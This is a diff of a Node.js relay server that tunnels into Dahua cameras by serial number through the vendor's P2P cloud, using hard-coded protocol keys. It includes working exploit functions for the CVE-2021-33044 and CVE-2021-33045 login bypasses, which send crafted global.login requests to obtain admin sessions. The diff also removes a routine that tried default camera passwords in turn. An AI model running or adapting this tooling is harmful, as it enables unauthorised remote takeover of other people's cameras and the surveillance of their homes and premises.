@@ -1,26 +1,12 @@
 #!/usr/bin/env node
 /**
- * Dahua P2P Tunnel Relay Server v3.0
+ * Dahua P2P Tunnel Relay Server v3.4
  * ===================================
- * Implements the full Dahua P2P protocol:
- *   - P2P handshake (UDP to easy4ipcloud.com:8800)
- *   - PTCP protocol (TCP-over-UDP tunneling)
- *   - NAT traversal (STUN-like hole punching)
- *   - HTTP/CGI proxy through the P2P tunnel
+ * CRITICAL FIX: UDP message queue — messages arriving between
+ *   operations are now buffered instead of silently dropped.
+ *   This was the root cause of all channel timeout failures.
  *
  * Based on: https://github.com/khoanguyen-3fc/dh-p2p
- *
- * Endpoints:
- *   GET  /health        - Health check
- *   GET  /:serial       - Legacy P2P status check
- *   POST /tunnel        - CGI request through P2P tunnel
- *
- * Deploy on Render (free):
- *   1. Upload this file to a GitHub repo
- *   2. Create new Web Service on render.com
- *   3. Build Command: (leave empty)
- *   4. Start Command: node dahua_tunnel_relay.js
- *   5. Copy the URL and paste it in the app
  */
 
 const http = require('http');
@@ -28,7 +14,6 @@ const dgram = require('dgram');
 const dns = require('dns');
 const crypto = require('crypto');
 
-// ── Constants ──
 var MAIN_SERVER = 'www.easy4ipcloud.com';
 var MAIN_PORT = 8800;
 var P2P_USERNAME = 'cba1b29e32cb17aa46b8ff9e73c7f40b';
@@ -38,7 +23,6 @@ var IV = Buffer.from('2z52*lk9o6HRyJrf');
 var PORT = process.env.PORT || 8080;
 var CSEQ = 0;
 
-// ── DNS Resolution ──
 function resolveHostname(hostname) {
   return new Promise(function(resolve, reject) {
     dns.resolve4(hostname, function(err, addresses) {
@@ -48,7 +32,6 @@ function resolveHostname(hostname) {
   });
 }
 
-// ── WSSE Auth for P2P Service ──
 function buildWSSE() {
   var nonce = Math.floor(Math.random() * 0x7FFFFFFF);
   var curdate = new Date().toISOString().replace(/\.\d+Z$/, 'Z');
@@ -57,7 +40,6 @@ function buildWSSE() {
   return 'UsernameToken Username="' + P2P_USERNAME + '", PasswordDigest="' + digest + '", Nonce="' + nonce + '", Created="' + curdate + '"';
 }
 
-// ── Build P2P Request (DHP2P over UDP) ──
 function buildP2PRequest(method, path, body) {
   body = body || '';
   CSEQ++;
@@ -75,16 +57,13 @@ function buildP2PRequest(method, path, body) {
   return Buffer.from(req, 'utf8');
 }
 
-// ── Parse P2P Response ──
 function parseP2PResponse(data) {
   var str = data.toString('utf8');
   var splitIdx = str.indexOf('\r\n\r\n');
   var headerPart = splitIdx >= 0 ? str.substring(0, splitIdx) : str;
   var body = splitIdx >= 0 ? str.substring(splitIdx + 4) : '';
   var lines = headerPart.split('\r\n');
-  var firstLine = lines[0];
-  var firstParts = firstLine.split(' ');
-  var version = firstParts[0];
+  var firstParts = lines[0].split(' ');
   var code = parseInt(firstParts[1]) || 0;
   var status = firstParts.slice(2).join(' ');
   var headers = {};
@@ -100,10 +79,9 @@ function parseP2PResponse(data) {
       xmlBody[m[1]] = m[2].trim();
     }
   }
-  return { version: version, code: code, status: status, headers: headers, body: body, xmlBody: xmlBody };
+  return { code: code, status: status, headers: headers, body: body, xmlBody: xmlBody };
 }
 
-// ── Device Auth Helpers ──
 function getDeviceKey(username, password) {
   var key = username + ':Login to ' + RANDSALT + ':' + password;
   return crypto.createHash('md5').update(key).digest('hex').toUpperCase();
@@ -131,24 +109,20 @@ function getDeviceAuth(username, key, nonce, payload) {
   return String(curdate) + auth + String(nonce) + RANDSALT + username;
 }
 
-// ── IP to Buffer ──
 function ipToBuffer(ip) {
-  var parts = ip.split('.').map(Number);
-  return Buffer.from(parts);
+  return Buffer.from(ip.split('.').map(Number));
 }
 
-// ── Invert Buffer (0xFF - b for each byte) ──
 function invertBuffer(buf) {
   var result = Buffer.alloc(buf.length);
   for (var i = 0; i < buf.length; i++) result[i] = 0xFF - buf[i];
   return result;
 }
 
-// ── UDP Socket with PTCP Support ──
+// ── UDP Socket with PTCP + Message Queue ──
 function P2PSocket() {
   this.sock = dgram.createSocket('udp4');
   this.lport = 0;
-  this.lhost = '0.0.0.0';
   this.rhost = null;
   this.rport = 0;
   this.ptcpSent = 0;
@@ -157,6 +131,7 @@ function P2PSocket() {
   this.ptcpId = 0;
   this.rmid = 0;
   this._msgHandler = null;
+  this._msgQueue = []; // FIX: buffer messages that arrive between operations
 
   var self = this;
   this.sock.on('message', function(msg) {
@@ -164,6 +139,8 @@ function P2PSocket() {
       var h = self._msgHandler;
       self._msgHandler = null;
       h(msg, null);
+    } else {
+      self._msgQueue.push(msg); // FIX: queue instead of drop
     }
   });
   this.sock.on('error', function(err) {
@@ -179,9 +156,7 @@ P2PSocket.prototype.bind = function() {
   var self = this;
   return new Promise(function(resolve) {
     self.sock.bind(0, function() {
-      var addr = self.sock.address();
-      self.lport = addr.port;
-      self.lhost = addr.address;
+      self.lport = self.sock.address().port;
       resolve();
     });
   });
@@ -199,6 +174,10 @@ P2PSocket.prototype.send = function(data) {
 P2PSocket.prototype.recv = function(timeout) {
   var self = this;
   timeout = timeout || 5000;
+  // FIX: return queued message immediately if available
+  if (self._msgQueue.length > 0) {
+    return Promise.resolve(self._msgQueue.shift());
+  }
   return new Promise(function(resolve, reject) {
     var timer = setTimeout(function() {
       self._msgHandler = null;
@@ -229,7 +208,6 @@ P2PSocket.prototype.request = function(path, body, shouldRead) {
   });
 };
 
-// ── PTCP Packet Build ──
 P2PSocket.prototype.buildPTCP = function(body) {
   body = body || Buffer.alloc(0);
   if (!Buffer.isBuffer(body)) body = Buffer.from(body);
@@ -248,42 +226,32 @@ P2PSocket.prototype.buildPTCP = function(body) {
   return Buffer.concat([header, body]);
 };
 
-// ── PTCP Packet Parse ──
 P2PSocket.prototype.parsePTCP = function(data) {
   if (data.length < 24) throw new Error('PTCP packet too short');
-  var magic = data.toString('ascii', 0, 4);
-  if (magic !== 'PTCP') throw new Error('Invalid PTCP magic: ' + magic);
+  if (data.toString('ascii', 0, 4) !== 'PTCP') throw new Error('Invalid PTCP magic');
   return {
-    rlid: data.readUInt32BE(4),
-    llid: data.readUInt32BE(8),
-    pid: data.readUInt32BE(12),
-    lmid: data.readUInt32BE(16),
-    rmid: data.readUInt32BE(20),
-    body: data.subarray(24)
+    rlid: data.readUInt32BE(4), llid: data.readUInt32BE(8),
+    pid: data.readUInt32BE(12), lmid: data.readUInt32BE(16),
+    rmid: data.readUInt32BE(20), body: data.subarray(24)
   };
 };
 
-// ── PTCPPayload Build ──
 P2PSocket.prototype.buildPTCPPayload = function(realm, payload) {
   var header = Buffer.alloc(12);
-  var length = payload.length | 0x10000000;
-  header.writeUInt32BE(length, 0);
+  header.writeUInt32BE(payload.length | 0x10000000, 0);
   header.writeUInt32BE(realm >>> 0, 4);
   header.writeUInt32BE(0, 8);
   return Buffer.concat([header, payload]);
 };
 
-// ── PTCPPayload Parse ──
 P2PSocket.prototype.parsePTCPPayload = function(data) {
   if (data.length < 12) throw new Error('PTCPPayload too short');
   var length = data.readUInt32BE(0) & 0xFFFF;
-  var realm = data.readUInt32BE(4);
-  return { realm: realm, payload: data.subarray(12, 12 + length) };
+  return { realm: data.readUInt32BE(4), payload: data.subarray(12, 12 + length) };
 };
 
 P2PSocket.prototype.requestPTCP = function(body) {
-  var pkt = this.buildPTCP(body || Buffer.alloc(0));
-  return this.send(pkt);
+  return this.send(this.buildPTCP(body || Buffer.alloc(0)));
 };
 
 P2PSocket.prototype.readPTCP = function(timeout) {
@@ -300,16 +268,13 @@ P2PSocket.prototype.close = function() {
   try { this.sock.close(); } catch (e) {}
 };
 
-// ── HTTP Digest Auth ──
 function parseDigestAuth(header) {
   var result = {};
   var parts = header.replace(/^Digest\s/i, '').split(/,\s*/);
   for (var i = 0; i < parts.length; i++) {
     var eq = parts[i].indexOf('=');
     if (eq === -1) continue;
-    var key = parts[i].slice(0, eq).trim();
-    var val = parts[i].slice(eq + 1).trim().replace(/^"|"$/g, '');
-    result[key] = val;
+    result[parts[i].slice(0, eq).trim()] = parts[i].slice(eq + 1).trim().replace(/^"|"$/g, '');
   }
   return result;
 }
@@ -326,7 +291,7 @@ function buildDigestAuth(method, uri, params, username, password) {
   return auth;
 }
 
-// ── Establish P2P Tunnel ──
+// ── Establish P2P Tunnel (matches reference exactly) ──
 async function establishTunnel(serial, username, password, targetPort) {
   targetPort = targetPort || 80;
   var mainIp = await resolveHostname(MAIN_SERVER);
@@ -340,10 +305,8 @@ async function establishTunnel(serial, username, password, targetPort) {
   deviceSock.setRemote(mainIp, MAIN_PORT);
 
   try {
-    // Step 1: Probe main server
     await mainSock.request('/probe/p2psrv');
 
-    // Step 2: Get P2P server (US) for this serial
     var onlineRes = await mainSock.request('/online/p2psrv/' + serial);
     var usAddr = onlineRes.xmlBody.US;
     if (!usAddr) throw new Error('Device not registered (no US server)');
@@ -351,7 +314,6 @@ async function establishTunnel(serial, username, password, targetPort) {
     var usServer = usParts[0];
     var usPort = parseInt(usParts[1]);
 
-    // Step 3: Probe device through US server
     var usSock = new P2PSocket();
     await usSock.bind();
     usSock.setRemote(usServer, usPort);
@@ -359,14 +321,12 @@ async function establishTunnel(serial, username, password, targetPort) {
     await usSock.request('/info/device/' + serial);
     usSock.close();
 
-    // Step 4: Get relay server
     var relayRes = await mainSock.request('/online/relay');
     var relayAddr = relayRes.xmlBody.Address;
     var relayParts = relayAddr.split(':');
     var relayServer = relayParts[0];
     var relayPort = parseInt(relayParts[1]);
 
-    // Step 5: Create P2P channel
     var dtype = 0;
     var key = null;
     var nonce = null;
@@ -386,16 +346,10 @@ async function establishTunnel(serial, username, password, targetPort) {
 
     var aidHex = Array.from(aid).map(function(b) { return b.toString(16); }).join(' ');
     var channelBody = auth + aidHex + ipaddr + '5.0.0';
-    // Try main server first
+    // Send channel request to MAIN_SERVER only (matches reference)
     await deviceSock.request('/device/' + serial + '/p2p-channel', channelBody, false);
-    // Also try US server directly (some firmware versions respond better)
-    var usChannelSock = new P2PSocket();
-    await usChannelSock.bind();
-    usChannelSock.setRemote(usServer, usPort);
-    try { await usChannelSock.request('/device/' + serial + '/p2p-channel', channelBody, false); } catch(e) {}
-    // Keep usChannelSock open to listen for device response too
 
-    // Step 6: Get relay agent
+    // Get relay agent
     mainSock.setRemote(relayServer, relayPort);
     var agentRes = await mainSock.request('/relay/agent');
     var token = agentRes.xmlBody.Token;
@@ -404,23 +358,16 @@ async function establishTunnel(serial, username, password, targetPort) {
     var agentServer = agentParts[0];
     var agentPort = parseInt(agentParts[1]);
 
-    // Step 7: Start relay
+    // Start relay — device won't respond until this completes
     mainSock.setRemote(agentServer, agentPort);
     await mainSock.request('/relay/start/' + token, ':0');
 
-    // Step 8: Read device channel response
-    var devRaw = null;
-    var devParsed = null;
-    // Try reading from deviceSock first (main server path)
-    try { devRaw = await deviceSock.recv(8000); devParsed = parseP2PResponse(devRaw); } catch(e) {}
-    // If no response, try usChannelSock (US server path)
-    if (!devParsed || devParsed.code < 200) {
-      try { devRaw = await usChannelSock.recv(8000); devParsed = parseP2PResponse(devRaw); } catch(e) {}
-    }
-    if (!devParsed) throw new Error('Device channel timeout (no response from main or US server)');
+    // Read device channel response (may have been queued during relay setup)
+    var devRaw = await deviceSock.recv(10000);
+    var devParsed = parseP2PResponse(devRaw);
     if (devParsed.code < 200) {
-      try { devRaw = await deviceSock.recv(5000); devParsed = parseP2PResponse(devRaw); } catch(e) {}
-      if (!devParsed || devParsed.code < 200) { try { devRaw = await usChannelSock.recv(5000); devParsed = parseP2PResponse(devRaw); } catch(e) {} }
+      devRaw = await deviceSock.recv(5000);
+      devParsed = parseP2PResponse(devRaw);
     }
     if (devParsed.code >= 400) {
       if (dtype === 0 && devParsed.code === 403) throw new Error('AUTH_REQUIRED');
@@ -429,8 +376,7 @@ async function establishTunnel(serial, username, password, targetPort) {
 
     var deviceLaddr = devParsed.xmlBody.LocalAddr;
     if (dtype > 0) {
-      var devNonce = devParsed.xmlBody.Nonce;
-      deviceLaddr = getDec(key, devNonce, deviceLaddr);
+      deviceLaddr = getDec(key, devParsed.xmlBody.Nonce, deviceLaddr);
     }
 
     var pubAddr = devParsed.xmlBody.PubAddr;
@@ -439,17 +385,16 @@ async function establishTunnel(serial, username, password, targetPort) {
     var devicePort = parseInt(pubParts[1]);
     deviceSock.setRemote(deviceServer, devicePort);
 
-    // Step 9: Register relay channel
+    // Register relay channel
     mainSock.setRemote(mainIp, MAIN_PORT);
     var relayAuth = '';
     if (dtype > 0) relayAuth = getDeviceAuth(username, key, nonce);
     await mainSock.request('/device/' + serial + '/relay-channel', relayAuth + agentServer + ':' + agentPort, false);
 
-    // Step 10: Read agent response
     mainSock.setRemote(agentServer, agentPort);
     await mainSock.recv(5000);
 
-    // Step 11: PTCP handshake with agent
+    // PTCP handshake with agent
     await mainSock.requestPTCP(Buffer.from([0x00, 0x03, 0x01, 0x00]));
     await mainSock.readPTCP();
 
@@ -460,7 +405,7 @@ async function establishTunnel(serial, username, password, targetPort) {
 
     await mainSock.requestPTCP();
 
-    // Step 12: NAT traversal (direct to device)
+    // NAT traversal
     var invertedAid = invertBuffer(aid);
     var cookie = crypto.randomBytes(4);
     var trasnId = crypto.randomBytes(12);
@@ -469,43 +414,31 @@ async function establishTunnel(serial, username, password, targetPort) {
     ipToBuffer(deviceServer).copy(eaddrBase, 2);
     var invertedEaddr = invertBuffer(eaddrBase);
 
-    var natPkt1 = Buffer.concat([
-      Buffer.from([0xff, 0xfe, 0xff, 0xe7]),
-      cookie, trasnId,
-      Buffer.from([0x7f, 0xd5, 0xff, 0xf7]),
-      invertedAid,
-      Buffer.from([0xff, 0xfb, 0xff, 0xf7, 0xff, 0xfe]),
-      invertedEaddr
-    ]);
-    await deviceSock.send(natPkt1);
+    await deviceSock.send(Buffer.concat([
+      Buffer.from([0xff, 0xfe, 0xff, 0xe7]), cookie, trasnId,
+      Buffer.from([0x7f, 0xd5, 0xff, 0xf7]), invertedAid,
+      Buffer.from([0xff, 0xfb, 0xff, 0xf7, 0xff, 0xfe]), invertedEaddr
+    ]));
 
     var natResponse = await deviceSock.recv(5000);
     var rtransId = natResponse.subarray(8, 20);
 
     var laddrParts = deviceLaddr.split(':');
-    var laddrIp = laddrParts[0];
-    var laddrPort = parseInt(laddrParts[1]);
     var laddrEaddr = Buffer.alloc(6);
-    laddrEaddr.writeUInt16BE(laddrPort, 0);
-    ipToBuffer(laddrIp).copy(laddrEaddr, 2);
+    laddrEaddr.writeUInt16BE(parseInt(laddrParts[1]), 0);
+    ipToBuffer(laddrParts[0]).copy(laddrEaddr, 2);
 
-    var natPkt2 = Buffer.concat([
-      Buffer.from([0xfe, 0xfe, 0xff, 0xe7]),
-      cookie, rtransId,
-      Buffer.from([0x7f, 0xd6, 0xff, 0xf7]),
-      invertedAid,
-      Buffer.from([0xff, 0xfb, 0xff, 0xf7, 0xff, 0xfe]),
-      laddrEaddr
-    ]);
-    await deviceSock.send(natPkt2);
+    await deviceSock.send(Buffer.concat([
+      Buffer.from([0xfe, 0xfe, 0xff, 0xe7]), cookie, rtransId,
+      Buffer.from([0x7f, 0xd6, 0xff, 0xf7]), invertedAid,
+      Buffer.from([0xff, 0xfb, 0xff, 0xf7, 0xff, 0xfe]), laddrEaddr
+    ]));
 
     if (dtype > 0) await deviceSock.recv(5000);
 
     var natPkt3 = Buffer.concat([
-      Buffer.from([0xfe, 0xfe, 0xff, 0xf3]),
-      cookie, rtransId,
-      Buffer.from([0x7f, 0xd6, 0xff, 0xf7]),
-      invertedAid,
+      Buffer.from([0xfe, 0xfe, 0xff, 0xf3]), cookie, rtransId,
+      Buffer.from([0x7f, 0xd6, 0xff, 0xf7]), invertedAid,
       Buffer.from([0xff, 0xfb, 0xff, 0xf7, 0xff, 0xfe]),
       Buffer.from([0xa8, 0x13, 0x3f, 0x57, 0xfe, 0x37])
     ]);
@@ -515,20 +448,18 @@ async function establishTunnel(serial, username, password, targetPort) {
       for (var j = 0; j < 5; j++) await deviceSock.recv(5000);
     }
 
-    // Step 13: PTCP handshake with device
+    // PTCP handshake with device
     await deviceSock.requestPTCP(Buffer.from([0x00, 0x03, 0x01, 0x00]));
     await deviceSock.readPTCP();
 
     await deviceSock.requestPTCP(Buffer.concat([
-      Buffer.from([0x19, 0x00, 0x00, 0x00]),
-      Buffer.alloc(4), Buffer.alloc(4), sign
+      Buffer.from([0x19, 0x00, 0x00, 0x00]), Buffer.alloc(4), Buffer.alloc(4), sign
     ]));
     var devPtcp = await deviceSock.readPTCP();
     if (devPtcp.body.length === 0) devPtcp = await deviceSock.readPTCP();
 
     await deviceSock.requestPTCP(Buffer.concat([
-      Buffer.from([0x1b, 0x00, 0x00, 0x00]),
-      Buffer.alloc(4), Buffer.alloc(4)
+      Buffer.from([0x1b, 0x00, 0x00, 0x00]), Buffer.alloc(4), Buffer.alloc(4)
     ]));
     await deviceSock.readPTCP();
 
@@ -536,29 +467,34 @@ async function establishTunnel(serial, username, password, targetPort) {
   } catch (err) {
     mainSock.close();
     deviceSock.close();
-    try { usChannelSock.close(); } catch(e) {}
     throw err;
   }
 }
 
-// ── Send HTTP Through Tunnel ──
+async function bindTunnelPort(deviceSock, targetPort) {
+  var realmId = crypto.randomBytes(4).readUInt32BE(0);
+  var realmBuf = Buffer.alloc(4);
+  realmBuf.writeUInt32BE(realmId, 0);
+  var portBuf = Buffer.alloc(4);
+  portBuf.writeUInt32BE(targetPort, 0);
+  await deviceSock.requestPTCP(Buffer.concat([Buffer.from([0x11, 0x00, 0x00, 0x00]), realmBuf, Buffer.alloc(4), portBuf, Buffer.from([0x7f, 0x00, 0x00, 0x01])]));
+  var bRes = await deviceSock.readPTCP();
+  if (bRes.body.length === 0) bRes = await deviceSock.readPTCP();
+  return realmId;
+}
+
 async function sendHTTPThroughTunnel(deviceSock, realmId, httpPath, method, extraHeaders, body) {
   method = method || 'GET';
   extraHeaders = extraHeaders || {};
   body = body || '';
-
-  var httpReq = method + ' ' + httpPath + ' HTTP/1.1\r\n';
-  httpReq += 'Host: 127.0.0.1\r\n';
+  var httpReq = method + ' ' + httpPath + ' HTTP/1.1\r\nHost: 127.0.0.1\r\n';
   var keys = Object.keys(extraHeaders);
-  for (var i = 0; i < keys.length; i++) {
-    httpReq += keys[i] + ': ' + extraHeaders[keys[i]] + '\r\n';
-  }
+  for (var i = 0; i < keys.length; i++) httpReq += keys[i] + ': ' + extraHeaders[keys[i]] + '\r\n';
   if (body) httpReq += 'Content-Length: ' + Buffer.byteLength(body) + '\r\n';
   httpReq += 'Connection: close\r\n\r\n';
   if (body) httpReq += body;
 
-  var payload = deviceSock.buildPTCPPayload(realmId, Buffer.from(httpReq));
-  await deviceSock.requestPTCP(payload);
+  await deviceSock.requestPTCP(deviceSock.buildPTCPPayload(realmId, Buffer.from(httpReq)));
 
   var chunks = [];
   var attempts = 0;
@@ -568,19 +504,16 @@ async function sendHTTPThroughTunnel(deviceSock, realmId, httpPath, method, extr
       var res = await deviceSock.readPTCP(3000);
       if (res.body.length === 0) continue;
       if (res.body[0] === 0x10) {
-        var parsed = deviceSock.parsePTCPPayload(res.body);
-        chunks.push(parsed.payload);
+        chunks.push(deviceSock.parsePTCPPayload(res.body).payload);
       } else if (res.body[0] === 0x12) {
         break;
       }
     } catch (e) { break; }
   }
 
-  // Send DISC
   var realmBuf = Buffer.alloc(4);
   realmBuf.writeUInt32BE(realmId >>> 0, 0);
-  var discBody = Buffer.concat([Buffer.from([0x12, 0x00, 0x00, 0x00]), realmBuf, Buffer.alloc(4), Buffer.from('DISC')]);
-  await deviceSock.requestPTCP(discBody);
+  await deviceSock.requestPTCP(Buffer.concat([Buffer.from([0x12, 0x00, 0x00, 0x00]), realmBuf, Buffer.alloc(4), Buffer.from('DISC')]));
 
   var httpResponse = Buffer.concat(chunks).toString('utf8');
   var splitIdx = httpResponse.indexOf('\r\n\r\n');
@@ -597,143 +530,6 @@ async function sendHTTPThroughTunnel(deviceSock, realmId, httpPath, method, extr
   return { status: httpStatus, headers: respHeaders, body: respBody };
 }
 
-// ── CGI Through Tunnel (with auto-auth) ──
-async function cgiThroughTunnel(serial, cgiPath, options) {
-  options = options || {};
-  var username = options.username;
-  var password = options.password;
-  var httpUser = options.http_user;
-  var httpPass = options.http_pass;
-  var targetPort = options.target_port || 80;
-  var autoAuth = options.auto_auth || false;
-
-  var defaultCreds = [
-    { user: null, pass: null },
-    { user: 'admin', pass: 'admin' },
-    { user: 'admin', pass: '12345' },
-    { user: 'admin', pass: '888888' },
-    { user: 'admin', pass: '' },
-    { user: 'admin', pass: 'password' }
-  ];
-
-  var credsToTry = autoAuth ? defaultCreds : [{ user: username, pass: password }];
-  var workingCreds = null;
-
-  for (var ci = 0; ci < credsToTry.length; ci++) {
-    var cred = credsToTry[ci];
-    var tunnel = null;
-    try {
-      tunnel = await establishTunnel(serial, cred.user, cred.pass, targetPort);
-
-      var realmId = crypto.randomBytes(4).readUInt32BE(0);
-      var realmBuf = Buffer.alloc(4);
-      realmBuf.writeUInt32BE(realmId, 0);
-
-      // Bind port
-      var portBuf = Buffer.alloc(4);
-      portBuf.writeUInt32BE(targetPort, 0);
-      var bindBody = Buffer.concat([Buffer.from([0x11, 0x00, 0x00, 0x00]), realmBuf, Buffer.alloc(4), portBuf, Buffer.from([0x7f, 0x00, 0x00, 0x01])]);
-      await tunnel.deviceSock.requestPTCP(bindBody);
-      var bRes = await tunnel.deviceSock.readPTCP();
-      if (bRes.body.length === 0) bRes = await tunnel.deviceSock.readPTCP();
-
-      // Send CGI request (no auth first)
-      var httpCreds = (cred.user && cred.pass) ? { http_user: cred.user, http_pass: cred.pass } : { http_user: httpUser, http_pass: httpPass };
-      var response = await sendHTTPThroughTunnel(tunnel.deviceSock, realmId, cgiPath, 'GET', {}, '');
-
-      // If 401, retry with digest auth
-      if (response.status === 401 && httpCreds.http_user) {
-        // Need a new realm for the second attempt
-        realmId = crypto.randomBytes(4).readUInt32BE(0);
-        realmBuf = Buffer.alloc(4);
-        realmBuf.writeUInt32BE(realmId, 0);
-        portBuf = Buffer.alloc(4);
-        portBuf.writeUInt32BE(targetPort, 0);
-        bindBody = Buffer.concat([Buffer.from([0x11, 0x00, 0x00, 0x00]), realmBuf, Buffer.alloc(4), portBuf, Buffer.from([0x7f, 0x00, 0x00, 0x01])]);
-        await tunnel.deviceSock.requestPTCP(bindBody);
-        bRes = await tunnel.deviceSock.readPTCP();
-        if (bRes.body.length === 0) bRes = await tunnel.deviceSock.readPTCP();
-
-        var wwwAuth = response.headers['WWW-Authenticate'] || response.headers['www-authenticate'];
-        if (wwwAuth) {
-          var dp = parseDigestAuth(wwwAuth);
-          var authHeader = buildDigestAuth('GET', cgiPath, dp, httpCreds.http_user, httpCreds.http_pass);
-          response = await sendHTTPThroughTunnel(tunnel.deviceSock, realmId, cgiPath, 'GET', { Authorization: authHeader }, '');
-        }
-      }
-
-      tunnel.deviceSock.close();
-      tunnel.mainSock.close();
-
-      if (response.status === 200) {
-        return { status: 200, body: response.body, headers: response.headers, credentials: { username: cred.user, password: cred.pass } };
-      }
-      if (!autoAuth) {
-        return { status: response.status, body: response.body, headers: response.headers };
-      }
-    } catch (err) {
-      if (tunnel) { tunnel.deviceSock.close(); tunnel.mainSock.close(); }
-      if (!autoAuth) throw err;
-      // Continue to next credential
-    }
-  }
-
-  return { status: 0, body: '', error: 'All credential attempts failed' };
-}
-
-// ── Legacy P2P Status Check ──
-async function checkP2P(serial) {
-  var mainIp = await resolveHostname(MAIN_SERVER);
-  var req1 = buildP2PRequest('DHGET', '/online/p2psrv/' + serial);
-
-  return new Promise(function(resolve) {
-    var client = dgram.createSocket('udp4');
-    var resolved = false;
-    client.on('message', function(data) {
-      if (resolved) return; resolved = true; client.close();
-      var res = parseP2PResponse(data);
-      var usAddr = res.xmlBody.US;
-      if (!usAddr) {
-        resolve({ serial: serial, online: false, error: 'Device not registered' });
-        return;
-      }
-      var usParts = usAddr.split(':');
-      var usIp = usParts[0];
-      var usPort = parseInt(usParts[1]);
-      var req2 = buildP2PRequest('DHGET', '/probe/device/' + serial);
-      var client2 = dgram.createSocket('udp4');
-      var r2 = false;
-      client2.on('message', function(d2) {
-        if (r2) return; r2 = true; client2.close();
-        var pres = parseP2PResponse(d2);
-        resolve({ serial: serial, online: pres.code === 200, relay: usAddr, probe_code: pres.code });
-      });
-      client2.on('error', function() { if (!r2) { r2 = true; client2.close(); resolve({ serial: serial, online: false, error: 'Probe failed' }); } });
-      setTimeout(function() { if (!r2) { r2 = true; client2.close(); resolve({ serial: serial, online: false, error: 'Probe timeout' }); } }, 4000);
-      client2.send(req2, usPort, usIp);
-    });
-    client.on('error', function() { if (!resolved) { resolved = true; client.close(); resolve({ serial: serial, online: false, error: 'Server timeout' }); } });
-    setTimeout(function() { if (!resolved) { resolved = true; client.close(); resolve({ serial: serial, online: false, error: 'Timeout' }); } }, 4000);
-    client.send(req1, MAIN_PORT, mainIp);
-  });
-}
-
-
-// ── Bind Tunnel Port Helper ──
-async function bindTunnelPort(deviceSock, targetPort) {
-  var realmId = crypto.randomBytes(4).readUInt32BE(0);
-  var realmBuf = Buffer.alloc(4);
-  realmBuf.writeUInt32BE(realmId, 0);
-  var portBuf = Buffer.alloc(4);
-  portBuf.writeUInt32BE(targetPort, 0);
-  var bindBody = Buffer.concat([Buffer.from([0x11, 0x00, 0x00, 0x00]), realmBuf, Buffer.alloc(4), portBuf, Buffer.from([0x7f, 0x00, 0x00, 0x01])]);
-  await deviceSock.requestPTCP(bindBody);
-  var bRes = await deviceSock.readPTCP();
-  if (bRes.body.length === 0) bRes = await deviceSock.readPTCP();
-  return realmId;
-}
-
-// ── CVE-2021-33044 Login Bypass (NetKeyboard) ──
 async function exploitLoginBypass(deviceSock, targetPort) {
   var detail = [];
   var loginPayload = JSON.stringify({ method: 'global.login', params: { userName: 'admin', password: 'Not Used', clientType: 'NetKeyboard', loginType: 'Direct', authorityType: 'Default', passwordType: 'Default' }, id: 1, session: 0 });
@@ -742,152 +538,133 @@ async function exploitLoginBypass(deviceSock, targetPort) {
   detail.push('Login bypass HTTP ' + loginRes.status);
   if (loginRes.status !== 200) return { success: false, detail: detail, error: 'HTTP ' + loginRes.status };
   var loginData;
-  try { loginData = JSON.parse(loginRes.body); } catch(e) { return { success: false, detail: detail, error: 'Invalid JSON: ' + loginRes.body.substring(0, 100) }; }
+  try { loginData = JSON.parse(loginRes.body); } catch(e) { return { success: false, detail: detail, error: 'Invalid JSON' }; }
   if (loginData.result === true) { detail.push('Bypass successful (single step)'); return { success: true, detail: detail, session: String(loginData.session) }; }
   if (loginData.error && loginData.params) {
     var random = loginData.params.random || '';
     var realm = loginData.params.realm || '';
     var tempSession = String(loginData.session || '');
-    detail.push('Got challenge: realm=' + realm + ', random=' + random);
+    detail.push('Got challenge: realm=' + realm);
     var hash1 = crypto.createHash('md5').update('admin:' + realm + ':admin').digest('hex').toUpperCase();
     var hash2 = crypto.createHash('md5').update('admin:' + random + ':' + hash1).digest('hex').toUpperCase();
     var step2Payload = JSON.stringify({ method: 'global.login', params: { userName: 'admin', password: hash2, clientType: 'NetKeyboard', loginType: 'Direct', authorityType: 'Default', passwordType: 'Default' }, id: 2, session: tempSession });
     realmId = await bindTunnelPort(deviceSock, targetPort);
     var step2Res = await sendHTTPThroughTunnel(deviceSock, realmId, '/RPC2', 'POST', {'Content-Type':'application/json'}, step2Payload);
     detail.push('Step 2 HTTP ' + step2Res.status);
-    if (step2Res.status === 200) { try { var step2Data = JSON.parse(step2Res.body); if (step2Data.result === true) { detail.push('Bypass successful (two step)'); return { success: true, detail: detail, session: String(step2Data.session) }; } detail.push('Step 2 error: ' + (step2Data.error ? JSON.stringify(step2Data.error) : 'no result')); } catch(e) { detail.push('Step 2 parse error: ' + step2Res.body.substring(0, 100)); } }
+    if (step2Res.status === 200) { try { var s2 = JSON.parse(step2Res.body); if (s2.result === true) { detail.push('Bypass successful (two step)'); return { success: true, detail: detail, session: String(s2.session) }; } } catch(e) {} }
   }
   return { success: false, detail: detail, error: 'Bypass did not return session' };
 }
 
-
-// ── CVE-2021-33045 Login Bypass (Loopback) ──
 async function exploitLoginBypassLoopback(deviceSock, targetPort) {
   var detail = [];
-  // Attempt 1: Plain password type with admin/admin
   var loginPayload = JSON.stringify({ method: 'global.login', params: { userName: 'admin', ipAddr: '127.0.0.1', password: 'admin', clientType: 'Local', loginType: 'Loopback', authorityType: 'Default', passwordType: 'Plain' }, id: 1, session: 0 });
   var realmId = await bindTunnelPort(deviceSock, targetPort);
   var loginRes = await sendHTTPThroughTunnel(deviceSock, realmId, '/RPC2', 'POST', {'Content-Type':'application/json'}, loginPayload);
   detail.push('Loopback (Plain) HTTP ' + loginRes.status);
-  if (loginRes.status === 200) {
-    try { var d = JSON.parse(loginRes.body); if (d.result === true) { detail.push('Loopback OK (Plain)'); return { success: true, detail: detail, session: String(d.session) }; } detail.push('Loopback (Plain) resp: ' + loginRes.body.substring(0, 120)); } catch(e) { detail.push('Parse err: ' + loginRes.body.substring(0, 120)); }
-  }
-  // Attempt 2: Default password type with MD5 hash
+  if (loginRes.status === 200) { try { var d = JSON.parse(loginRes.body); if (d.result === true) return { success: true, detail: detail, session: String(d.session) }; } catch(e) {} }
   var hash1 = crypto.createHash('md5').update('admin:admin:admin').digest('hex').toUpperCase();
   var loginPayload2 = JSON.stringify({ method: 'global.login', params: { userName: 'admin', ipAddr: '127.0.0.1', password: hash1, clientType: 'Local', loginType: 'Loopback', authorityType: 'Default', passwordType: 'Default' }, id: 2, session: 0 });
   realmId = await bindTunnelPort(deviceSock, targetPort);
   var loginRes2 = await sendHTTPThroughTunnel(deviceSock, realmId, '/RPC2', 'POST', {'Content-Type':'application/json'}, loginPayload2);
   detail.push('Loopback (Default) HTTP ' + loginRes2.status);
